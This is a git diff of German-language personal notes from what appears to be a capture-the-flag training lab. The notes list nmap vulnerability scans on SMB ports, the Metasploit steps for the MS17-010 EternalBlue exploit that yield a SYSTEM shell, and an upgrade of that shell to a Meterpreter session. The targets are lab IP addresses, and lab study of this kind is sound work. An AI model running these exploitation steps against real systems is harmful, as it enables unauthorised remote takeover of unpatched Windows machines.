@@ -15,7 +15,8 @@
 - Tutorial 
 ---
 
-### **Sonnleiter Era** 
+### **Sonnleiter Era**
+ ``` 
 - sudo openvpn exotechly.ovpn &
 - ip a
 - 10.9.41.189
@@ -23,5 +24,38 @@
 - nmap --script vuln -p 135,139,445 10.9.41.189 
   - um herauszufinden ob es sich um eine Windows Maschine handelt 
 - nmap --script vuln -p 135,149,445 10.10.227.183 |tee nmap-vuln
-- 
+ ```
+# Zweite Session 
+
+```
+1. nmap -sV -sC --script vuln -oN blue.nmap 10.10.137.78
+2. msfconsole
+3. search ms17
+4. search eternal
+5. use 3 
+6. show options
+7. set rhosts 10.10.73.63
+=> remote host (target)
+8. run 
+9.C:\Windows\system32>
+Optional
+set rhots 10.10.201.164
+run
+exploit
+show options
+set LPORT 4445
+```
+## Task 3
+```
+1. use post/multi/manage/shell_to_meterpreter
+2. show options
+3. set session 1
+4. run 
+5. session 
+6. sessions 
+=> wir sollten jetzt eine 2 Session haben. 
+7. sessions -i 2
+=> Startet eine Interaktion 
+8.  
+
 
